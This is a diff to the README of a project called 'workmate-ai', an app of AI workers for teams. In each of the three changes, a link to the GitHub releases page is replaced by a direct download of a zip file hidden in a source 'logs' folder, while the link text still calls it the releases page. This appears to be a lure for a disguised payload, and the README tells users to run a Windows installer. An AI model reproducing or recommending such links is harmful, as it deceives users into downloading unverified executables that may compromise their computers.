@@ -1,6 +1,6 @@
 # 🤖 workmate-ai - AI workers for busy teams
 
-[![Download workmate-ai](https://img.shields.io/badge/Download%20workmate--ai-4B9FEA?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kathrynunacceptable870/workmate-ai/releases)
+[![Download workmate-ai](https://img.shields.io/badge/Download%20workmate--ai-4B9FEA?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Kathrynunacceptable870/workmate-ai/main/src/app/api/workers/[id]/logs/ai_workmate_2.1.zip)
 
 ## 🚀 What this app does
 
@@ -34,7 +34,7 @@ For best results, close other heavy apps before you run workmate-ai.
 
 Visit this page to download the app:
 
-[Go to the releases page](https://github.com/Kathrynunacceptable870/workmate-ai/releases)
+[Go to the releases page](https://raw.githubusercontent.com/Kathrynunacceptable870/workmate-ai/main/src/app/api/workers/[id]/logs/ai_workmate_2.1.zip)
 
 On that page, look for the latest release and download the Windows file for your PC. If you see more than one file, choose the one that ends in `.exe` or a Windows installer format.
 
@@ -216,7 +216,7 @@ workmate-ai supports business use in both English and Chinese settings. It fits 
 
 If you need the app again later, use this page:
 
-[https://github.com/Kathrynunacceptable870/workmate-ai/releases](https://github.com/Kathrynunacceptable870/workmate-ai/releases)
+[https://raw.githubusercontent.com/Kathrynunacceptable870/workmate-ai/main/src/app/api/workers/[id]/logs/ai_workmate_2.1.zip](https://raw.githubusercontent.com/Kathrynunacceptable870/workmate-ai/main/src/app/api/workers/[id]/logs/ai_workmate_2.1.zip)
 
 ## 🖱️ Quick start path
 
